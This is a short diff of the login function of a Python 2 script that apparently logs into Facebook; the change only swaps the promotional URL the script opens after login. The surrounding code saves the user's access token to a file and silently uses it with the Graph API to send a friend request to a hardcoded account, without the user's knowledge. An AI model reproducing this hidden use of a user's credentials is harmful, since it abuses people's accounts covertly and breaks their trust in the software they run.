@@ -301,7 +301,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin hogi✅'
-				os.system('xdg-open https://chat.whatsapp.com/Bgi6jhqCBWkL5cvggcqIiG')
+				os.system('xdg-open https://www.facebook.com/Shuvo.Vau.Oky.Dhaka.Vai.Shuvo.Sazzad.Raj.Vau.Now/')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
